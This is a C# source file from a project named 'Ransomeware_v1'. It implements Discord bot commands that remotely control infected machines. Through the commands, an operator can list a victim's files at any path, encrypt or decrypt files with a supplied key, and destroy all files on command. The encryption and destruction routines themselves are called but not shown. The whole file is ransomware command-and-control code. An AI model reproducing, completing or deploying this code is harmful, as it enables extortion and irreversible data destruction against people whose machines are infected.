using System.Threading.Tasks;
using Discord;
using Discord.Commands;
using System.IO;


namespace Ransomeware_v1.Modules
{
    
    public class Commands : ModuleBase<SocketCommandContext>
    {
        private const string _FIX_ID = "ATCCTA";
        [Command(_FIX_ID + "_ping")]
        public async Task Ping()
        {
            await ReplyAsync("pong");
        }
        [Command("ALLBOT_showid")]
        public async Task ShowID()
        {
            await ReplyAsync("Bot " + _FIX_ID + " live");
        }
        [Command(_FIX_ID + "_files_with_path"), Alias(_FIX_ID + "_fwp")]
        public async Task ListFilesvsPath([Remainder] string root)
        {
            var builder = new EmbedBuilder()
            {
                Color = new Color(114, 137, 218),
                Description = "These are file in the path"
            };
            string[] files; 
            if (Directory.Exists(root)) {
                files = Destruction.List_file(root);
                await ReplyAsync("All files here");
                string ans = "";
                foreach (var file in files)
                {

                    if (ans.Length + file.Length < 1020)
                    {
                        ans += System.Environment.NewLine + file;
                    }
                    else
                    {
                        await ReplyAsync(ans);
                        ans = System.Environment.NewLine + file;
                    }

                }
                if (ans != "") await ReplyAsync(ans);
                return;
            } else
            {
                await ReplyAsync("Directory not Exists!!");
                return;
            }
            await ReplyAsync("Some things went wrong!!");
            //await ReplyAsync("", false, builder.Build());
        }
        [Command(_FIX_ID + "_encFile")]
        public async Task EncryptFile([Remainder] string key)
        {
            Crypto.Start_Encrypt(key);
            await ReplyAsync("Bot " + _FIX_ID + " Enc File Done");
        }
        [Command(_FIX_ID + "_decFile")]
        public async Task DecryptFile([Remainder] string key)
        {
            Crypto.OFF_Encrypt(key);
            await ReplyAsync("Bot " + _FIX_ID + " Decryp File Done");
        }
        [Command(_FIX_ID + "_destroyFile")]
        public async Task DestroyALLFile([Remainder] string key)
        {
            if (key != "yes")
            {
                await ReplyAsync("Thank God you not do that !!!");
                return;
            }
            Destruction.Start_Destroy();
            await ReplyAsync("Bot " + _FIX_ID + " Destroy File Done!!!");
        }
    }
}